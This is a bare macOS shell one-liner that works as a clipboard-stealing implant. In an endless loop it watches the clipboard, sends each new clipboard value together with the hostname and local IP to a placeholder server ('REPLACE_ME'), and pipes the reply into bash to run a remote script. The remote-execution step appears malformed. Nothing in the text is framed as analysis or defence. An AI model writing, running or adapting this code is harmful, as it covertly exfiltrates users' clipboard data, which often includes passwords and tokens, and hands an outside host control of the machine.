while true; do if [[ "$(pbpaste)" != "$pbpaste_last" ]]; then p="$(echo $(pbpaste))"; lh=$(scutil --get LocalHostName); localip="$(ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}')"; curl --data "localhostname=$lh&clipboard=$p&localip=$localip" -X POST 'REPLACE_ME' | bash $(python -c "import sys, json; print json.load(sys.stdin)['script']") && pbpaste_last="$(pbpaste)"; sleep 1; fi; done
